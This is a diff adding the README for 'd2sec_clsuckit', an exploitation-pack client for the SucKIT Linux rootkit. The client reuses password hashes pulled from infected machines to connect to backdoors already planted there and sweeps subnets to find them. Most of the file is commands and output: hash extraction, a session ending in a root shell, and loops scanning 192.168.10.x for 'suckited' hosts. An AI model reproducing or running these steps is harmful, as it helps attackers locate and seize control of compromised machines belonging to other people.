@@ -1,0 +1,92 @@
+D2 Exploitation Pack
+
+Copyright (c) 2007-2008 DSquare Security, LLC
+All rights reserved.
+
+License information
+---------------------
+
+See the file "LICENSE.txt" for information on the history of this
+software, terms & conditions for usage, and a DISCLAIMER OF ALL
+WARRANTIES.
+
+Description
+------------
+
+d2sec_clsuckit is a suckit client modified :
+
+- to use hashpass directly. hashpass can be obtained from a file init or
+sk on corrupted boxes ...
+
+- to bruteforce class ip with the same passwd or hashpass
+
+Examples
+---------
+
+$ ./d2sec_clsuckit
+./d2sec_clsuckit [hsditcpwb] ...args
+-h      Specifies ip/hostname of host where is running
+        suckitd
+-s      Specifies port where we should listen for incoming
+        server' connection (if some firewalled etc), if not
+        specified, we'll get some from os
+-d      Specifies port of service we could use for authentication
+        echo, telnet, ssh, httpd... is probably good choice
+-i      Interval between request sends (in seconds)
+-t      Time we will wait for server before giving up (in seconds)
+-c      Connect timeout (in seconds)
+-p      Specifies a hashpass (eg. -p "\x2F\xB7\xAE....\x72\x16")
+-w      Specifies a passwd
+-b      Mode scan (to use with -w or -p)
+-g      Extract hashpass from sk (to use alone)
+
+$ ./d2sec_clsuckit -g /tmp/sk
+"\x5d\x41\xf1\x3c\x2f\x2c\x23\x89\xc1\xdd\xae\x0b\xf0\x14\x00\x49\xfe\xe6\xb6\xb4"
+
+$ ./d2sec_clsuckit -h 127.0.0.1 -d 22 -p "\x5d\x41\xf1\x3c\x2f\x2c\x23\x89\xc1\xdd\xae\x0b\xf0\x14\x00\x49\xfe\xe6\xb6\xb4"
+
+[#] 34281:127.0.0.1:22
+[!] server connected. escape character is '^K'
+/dev/null
+[root@pluton .sk12]#
+
+$ for i in `seq 1 254`; do ./d2sec_clsuckit -b -h 192.168.10.$i -d 22 -w blaat; done
+
+[#] 34539:192.168.10.1:22
+[#] 34541:192.168.10.2:22 .
+[#] 34544:192.168.10.3:22 (suckited) !
+[#] 34546:192.168.10.4:22 (suckited) !
+[#] 34549:192.168.10.5:22
+
+$ for i in `seq 1 254`; do ./d2sec_clsuckit -b -h 192.168.10.$i -p "\x5d\x41\xf1\x3c\x2f\x2c\x23\x89\xc1\xdd\xae\x0b\xf0\x14\x00\x49\xfe\xe6\xb6\xb4"; done
+
+[#] 34563:192.168.10.1:110
+[#] 34563:192.168.10.1:220
+[#] 34563:192.168.10.1:21
+[#] 34563:192.168.10.1:22
+[#] 34563:192.168.10.1:25
+[#] 34563:192.168.10.1:80
+[#] 34563:192.168.10.1:443
+[#] 34572:192.168.10.2:79
+[#] 34572:192.168.10.2:110
+[#] 34572:192.168.10.2:220
+[#] 34572:192.168.10.2:21
+[#] 34572:192.168.10.2:22 .
+[#] 34572:192.168.10.2:25 ...
+[#] 34572:192.168.10.2:80 ...
+[#] 34572:192.168.10.2:443
+[#] 34582:192.168.10.3:79
+[#] 34582:192.168.10.3:110
+[#] 34582:192.168.10.3:220
+[#] 34582:192.168.10.3:21
+[#] 34582:192.168.10.3:22 (suckited) !
+[#] 34588:192.168.10.4:79
+[#] 34588:192.168.10.4:110
+[#] 34588:192.168.10.4:220
+[#] 34588:192.168.10.4:21
+[#] 34588:192.168.10.4:22 (suckited) !
+[#] 34595:192.168.10.5:79
+[#] 34595:192.168.10.5:110
+[...]
+
+EOF
